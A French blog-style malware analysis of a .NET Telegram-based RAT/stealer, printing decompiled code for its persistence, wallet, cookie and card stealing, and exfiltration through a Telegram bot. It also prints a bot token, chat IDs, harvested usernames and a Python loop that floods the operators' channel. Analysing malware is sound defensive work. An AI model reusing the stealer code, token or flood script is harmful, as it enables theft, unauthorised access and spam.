---
title: "Malware Analysis d'une Virus Télégram"
date: 2022-01-08T12:00:00Z
description: "Voici comment j'ai reverse un malware RAT"
categories: ["malware-analysis"]
tags: ["reverse","virus",".net"]
keywords: ["tuto", "reverse", "dotnet", ".net","rat","malware","virus","remote execution"]
---
[//]: <> (Created By Vozec 25/11/2021)
---
## Introduction
Je suis tombé sur ce .exe et j'ai décidé de l'analyser.
Voici le fichier : [ici](./files/Do_Not_Execute)
*Attention à ne pas l'executer !*

## Commencement  
Comme le dernier analyse de malware , j'ai regardé sur Dnspy si le code était obfusqué .
A notre plus grande surprise il ne l'était pas !
Regardons de quoi est composé notre payload :

![All text](./img/dnspy.png)

La Première chose qui saute aux yeux et que c'est un malware !
Regardons la Class ``Client``

```C
public static void Main()
		{
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			for (int i = 0; i < Convert.ToInt32(Settings.Delay); i++){Thread.Sleep(1000);}
			if (!Settings.InitializeSettings()){Environment.Exit(0);}
			try
			{
				telegram.UploadFile(Program.Save(), false);
				if (!MutexControl.CreateMutex()){Environment.Exit(0);}
				if (Convert.ToBoolean(Settings.Anti)){Anti_Analysis.RunAntiAnalysis();}
				if (Convert.ToBoolean(Settings.Install)){NormalStartup.Install();}
				if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin()){ProcessCritical.Set();}
				Methods.PreventSleep();
			}
			catch{}
			while(true){
				try
				{
					if (!ClientSocket.IsConnected)
					{
						ClientSocket.Reconnect();
						ClientSocket.InitializeClient();
					}
				}catch{}
				Thread.Sleep(5000);
			}
		}
```

C'est notre Fonction Principal. Elle execute quelques fonctions au lancement du programme avant de boucler a l'infinie sur une connection à un socket .

Analysons : ```if (!Settings.InitializeSettings()){Environment.Exit(0);}``` :

On retrouve :
```C
public static bool InitializeSettings()
		{
			bool result;
			try
			{
				Settings.Key = Encoding.UTF8.GetString(Convert.FromBase64String(Settings.Key));
				Settings.aes256 = new Aes256(Settings.Key);
				Settings.TelegramToken = Settings.aes256.Decrypt(Settings.TelegramToken);
				Settings.TelegramChatID = Settings.aes256.Decrypt(Settings.TelegramChatID);
				Settings.Ports = Settings.aes256.Decrypt(Settings.Ports);
				Settings.Hosts = Settings.aes256.Decrypt(Settings.Hosts);
				Settings.Version = Settings.aes256.Decrypt(Settings.Version);
				Settings.Install = Settings.aes256.Decrypt(Settings.Install);
				Settings.MTX = Settings.aes256.Decrypt(Settings.MTX);
				Settings.Pastebin = Settings.aes256.Decrypt(Settings.Pastebin);
				Settings.Anti = Settings.aes256.Decrypt(Settings.Anti);
				Settings.BDOS = Settings.aes256.Decrypt(Settings.BDOS);
				Settings.Group = Settings.aes256.Decrypt(Settings.Group);
				Settings.Hwid = HwidGen.HWID();
				Settings.Serversignature = Settings.aes256.Decrypt(Settings.Serversignature);
				Settings.ServerCertificate = new X509Certificate2(Convert.FromBase64String(Settings.aes256.Decrypt(Settings.Certificate)));
				result = Settings.VerifyHash();
			}
			catch
			{
				result = false;
			}
			return result;
		}
```

Si on regarde les *string* présentes dans la class , on remarque qu'elles sont chiffrées puis encodées en Base64 .
Un petit coup d'oeil nous apprend que celle ci sont chiffrées en Aes256 .

Écrivons un programme pour les déchiffrer !

![All text](./img/string.png)

On copie ces string dans notre Programme .
On récupère l'IV , le salt et la Key en bytes écrites en dur .

```C
public static string masterKey = "Z25yb09udHlvSUsyY3JHWkUxWm5PbHR5M0NoRVJnQmE=";
rivate static readonly byte[] Salt = new byte[]{191,235,30,86,251,205,151,59,178,25,2,36,48,165,120,67,0,61,86,68,210,30,98,185,212,241,128,231,230,195,57,65};

public Aes256(string masterKey)
		{
			if (string.IsNullOrEmpty(masterKey))
			{
				throw new ArgumentException("masterKey can not be null or empty.");
			}
			using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(masterKey, Aes256.Salt, 50000))
			{
				this._key = rfc2898DeriveBytes.GetBytes(32);
				this._authKey = rfc2898DeriveBytes.GetBytes(64);
			}
		}

```
Puis aprés 300 lignes de codes , on obtient :

![All text](./img/string2.png)

La fonction La plus important est celle ci :

```C
public static string Decrypt(byte[] bytesToBeDecrypted)
	{
		byte[] bytes = null;
		using (MemoryStream memoryStream = new MemoryStream())
		{
		using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
		{
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Program.cryptKey, Program.saltBytes, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
			{
			cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
			cryptoStream.Close();
			}
			bytes = memoryStream.ToArray();
		}
		}
		return Encoding.UTF8.GetString(bytes);
	}
```

Tout le programme est disponible [ici](./files/getstring.zip)

La chose la plus intéréssante ici est le token du bot Télégram . Nous verrons ensuite ce que nous pouvons en faire .

#### Autres fonctions

On retrouve d'autres fonctions assez classique pour un virus :

- Un BitCoinAdress Clipper

```C
public static string GetText()
{
  string ReturnValue = string.Empty;
  try
  {
    Thread thread = new Thread(delegate()
    {
      ReturnValue = Clipboard.GetText();
    });
    thread.SetApartmentState(ApartmentState.STA);
    thread.Start();
    thread.Join();
  }
  catch
  {
  }
  return ReturnValue;
}
```
- Une pseudo antiDebug (Faciment Bypassable)
- Un stealer de cookies NordVpn/OpenVpn/ProtonVpn
- Un stealer de mots de passes Wifi (commande cmd "netsh ...")
- Une fonction pour prendre des screenshots de l'écran .
- Une execution de commandes à distance.
- Un DiscordToken Grabber.
- Du code pour voler des sessions télégram :

```C
private static string GetTdata()
		{
			string result = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
			Process[] processesByName = Process.GetProcessesByName("Telegram");
			if (processesByName.Length == 0)
			{
				return result;
			}
			return Path.Combine(Path.GetDirectoryName(ProcessList.ProcessExecutablePath(processesByName[0])), "tdata");
		}
```

- Un stealer de comptes Steam/Minecraft/Uplay grâce aux fichiers temporaires .
- Un stealer de comptes pré-enregistrés sur navigateurs (voir screen plus haut)
- Un stealer de wallets crypto.

```C
private static List<string[]> sWalletsDirectories = new List<string[]>
{
  new string[]{"Zcash",Paths.appdata + "\\Zcash"},
  new string[]{"Armory",Paths.appdata + "\\Armory"},
  new string[]{"Bytecoin",Paths.appdata + "\\bytecoin"},
  new string[]{"Jaxx",Paths.appdata + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb"},
  new string[]{"Exodus",Paths.appdata + "\\Exodus\\exodus.wallet"},
  new string[]{"Ethereum",Paths.appdata + "\\Ethereum\\keystore"},
  new string[]{"Electrum",Paths.appdata + "\\Electrum\\wallets"},
  new string[]{"AtomicWallet",Paths.appdata + "\\atomic\\Local Storage\\leveldb"},
  new string[]{"Guarda",Paths.appdata + "\\Guarda\\Local Storage\\leveldb"},
  new string[]{"Coinomi",Paths.lappdata + "\\Coinomi\\Coinomi\\wallets	}
};
```

- Un stealer de cartes bancaires :

```C
private static Dictionary<string, Regex> CreditCardTypes = new Dictionary<string, Regex>
	{
		{"Amex Cardnew Regex("^3[47][0-9]{13}$")},
		{"BCGlobal",new Regex("^(6541|6556)[0-9]{12}$")},
		{"Carte Blanche Card",new Regex("^389[0-9]{11}$")},
		{"Diners Club Card",new Regex("^3(?:0[0-5]|[68][0-9])[0-9]{11}$")},
		{"Discover Card",new Regex("6(?:011|5[0-9]{2})[0-9]{12}$")},
		{"Insta Payment Card",new Regex("^63[7-9][0-9]{13}$")},
		{"JCB Card",new Regex("^(?:2131|1800|35\\\\d{3})\\\\d{11}$")},
		{"KoreanLocalCard",new Regex("^9[0-9]{15}$")},
		{"Laser Card",new Regex("^(6304|6706|6709|6771)[0-9]{12,15}$")},
		{"Maestro Card",new Regex("^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$")},
		{"Mastercard",new Regex("5[1-5][0-9]{14}$")},
		{"Solo Card",new Regex("^(6334|6767)[0-9]{12}|(6334|6767)[0-9]{14}|(6334|6767)[0-9]{15}$")},
		{"Switch Card",new Regex("^(4903|4905|4911|4936|6333|6759)[0-9]{12}|(4903|4905|4911|4936|6333|6759)[0-9]{14}|(4903|4905|4911|4936|6333|6759)[0-9]{15}|564182[0-9]{10}|564182[0-9]{12}|564182[0-9]{13}|633110[0-9]{10}|633110[0-9]{12}|633110[0-9]{13}$")},
		{"Union Pay Card",new Regex("^(62[0-9]{14,17})$")},
		{"Visa Card",new Regex("4[0-9]{12}(?:[0-9]{3})?$")},
		{"Visa Master Card",new Regex("^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$")},
		{"Express Card",new Regex("3[47][0-9]{13}$")}
	};
```

- Des fonctions de persistances :

```C
Process.Start(new ProcessStartInfo
{
	FileName = "cmd",
	Arguments = string.Concat(new string[]
	{
	"/c schtasks /create /f /sc onlogon /rl highest /tn \"",
	Path.GetFileNameWithoutExtension(fileInfo.Name),
	"\" /tr '\"",
	fileInfo.FullName,
	"\"' & exit"
	}),
	WindowStyle = ProcessWindowStyle.Hidden,
	CreateNoWindow = true
});
```


Il n'y as pas grand chose d'autres d'intéréssant à par le nom du malware : "WorldWind Stealer"
Le nom traine un peu partout et une bref recherche nous permet de retrouver le builder de l'implant.


##### Du coté de télégram

Dans le code on retrouve 2 tokens , le premier est celui du bot "Virus" .
Malheuresement celui si semble éteint ou supprimés :

```json
{"ok":false,"error_code":401,"description":"Unauthorized"}
```

On revanche on a une autre url en clair dans le payload :

```bash
httpClient2.PostAsync("https://api.telegram.org/bot1119746739:AAGMhvpUjXI4CzIfizRC--VXilxnkJlhaf8/send" + type + "?chat_id=1096425866", multipartFormDataContent2).Wait();
```

On en récupère

- un chatID : 1096425866
- un token : 1119746739:AAGMhvpUjXI4CzIfizRC--VXilxnkJlhaf8

En allant sur cette url : https://api.telegram.org/bot1119746739:AAGMhvpUjXI4CzIfizRC--VXilxnkJlhaf8/getUpdates

On retrouve un grand nombre de personne.
Cet url étant stocké dans le code sans variable, je suppose que c'est le groupe des clients de "WoldWind Stealer"
De plus , une vérication du groupe est fait lors de l'envoie des informations d'une victime a un des pirates .
Cette fonction est une sorte de sécurité pour garder le controle des channels ou le bot peut envoyer les informations privées :

```C
if (text != Settings.TelegramChatID)
	{
		string text2 = jsonnode2["chat"]["username"];
		string str = jsonnode2["chat"]["first_name"];
		telegram.sendText("\ud83d\udc51 You not my owner " + str);
		telegram.sendText(string.Concat(new string[]
		{
			"\ud83d\udc51 Unknown user with id ",
			text,
			" and username @",
			text2,
			" send command to bot!"
		}));
		break;
	}
```

On peut donc en tirer une liste de 100 utilisateurs :
```
Stella940628
Laura282924
Lysandra815159
Spielberg500867
Winifred927624
Sarah973325
Julia465280
Steven756717

...

Veronica290343
Acacia506278
lover252655
moamoa553528
Laura799863
Pandora313304
```

Finalement, on peut les spam sur cette url parce que c'est fun aprés tout:

https://api.telegram.org/bot1119746739:AAGMhvpUjXI4CzIfizRC--VXilxnkJlhaf8/sendMessage?chat_id=-1001512673124&text=Pwned

```python
import requests

url = "https://api.telegram.org/bot1119746739:AAGMhvpUjXI4CzIfizRC--VXilxnkJlhaf8/sendMessage?chat_id=-1001512673124&text=Pwned"

while(True):
  try:
    if('ok":true' in requests.get(url).text):
      print('Flood')
  except:
    pass
```

![All text](./img/final.png)
![All text](./img/flood.png)
